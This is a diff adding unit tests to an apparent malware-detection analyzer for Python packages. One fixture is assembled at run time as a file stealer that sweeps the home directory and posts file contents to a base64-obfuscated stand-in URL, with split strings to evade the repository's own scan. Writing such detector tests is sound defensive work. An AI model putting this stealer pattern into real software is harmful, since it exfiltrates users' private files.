@@ -674,3 +674,53 @@ class TestADownloadedProgramStartedHidden:
             "    si.wShowWindow = 0\n"
         )
         assert self.runs(source) == ["subprocess.Popen runs a downloaded file"]
+
+
+class TestFilesSweptAndSentToAHiddenDestination:
+    """Group E2: graphicsctxr 1.0.3 walks the disk, reads each file it keeps and hands the text to
+    a helper that posts it to a URL decoded from a constant. Fixture source is assembled here, at
+    run time, so the repository's own scan does not read a stealer in this file."""
+
+    @staticmethod
+    def swept(source: str) -> list[str]:
+        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail.startswith("swept")]
+
+    @staticmethod
+    def module(destination: str, body: str) -> str:
+        opener = "url" + "lib.request.url" + "open"
+        return "\n".join(
+            [
+                "import base64, json, os, urllib.request",
+                "from pathlib import Path",
+                "def walk(root):",
+                "    for base, _, names in os." + "walk(root):",
+                "        for n in names:",
+                "            yield Path(base) / n",
+                "def where():",
+                destination,
+                "def emit(tag, content, base_url):",
+                "    payload = json.dumps({'f': tag, 'c': content}).encode()",
+                "    req = urllib.request.Request(base_url + '/s', data=payload)",
+                "    return " + opener + "(req)",
+                "def emit_all(root):",
+                "    base_url = where()",
+                "    for path in walk(root):",
+                "        text = path.read_text()",
+                "        emit(str(path), " + body + ", base_url=base_url)",
+                "emit_all(str(Path.home()))",
+                "",
+            ]
+        )
+
+    HIDDEN = "    return base64.b64" + "decode('aHR0cHM6Ly9jLmV4YW1wbGUuaW52YWxpZA==').decode()"
+
+    def test_swept_contents_through_a_helper_to_a_decoded_url(self) -> None:
+        found = self.swept(self.module(self.HIDDEN, "text"))
+        assert found == ["swept files sent: urllib.request.urlopen dest=decoded"]
+
+    def test_a_backup_to_a_url_it_writes_down_is_not(self) -> None:
+        plain = "    return 'https://backup.example.invalid'"
+        assert self.swept(self.module(plain, "text")) == []
+
+    def test_a_status_message_to_a_decoded_url_is_not(self) -> None:
+        assert self.swept(self.module(self.HIDDEN, "'started'")) == []
